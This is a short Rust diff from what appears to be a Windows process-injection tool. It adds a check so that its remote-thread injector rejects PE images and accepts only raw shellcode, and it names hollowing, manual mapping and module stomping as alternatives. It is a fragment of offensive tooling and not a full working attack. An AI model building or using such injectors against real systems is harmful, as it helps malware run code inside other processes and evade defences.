@@ -6,6 +6,16 @@ pub struct RemoteThreadInjector;
 #[cfg(windows)]
 impl Injector for RemoteThreadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
+        // RemoteThread injects shellcode, not PE images.  PE payloads must use
+        // Hollowing, ManualMap, or ModuleStomp (which forwards to hollowing).
+        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
+        if is_pe {
+            return Err(anyhow!(
+                "RemoteThread injection requires raw shellcode, not a PE image. \
+                 Use InjectionMethod::Hollowing or InjectionMethod::ModuleStomp for PE payloads."
+            ));
+        }
+
         use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
         use winapi::um::processthreadsapi::OpenProcess;
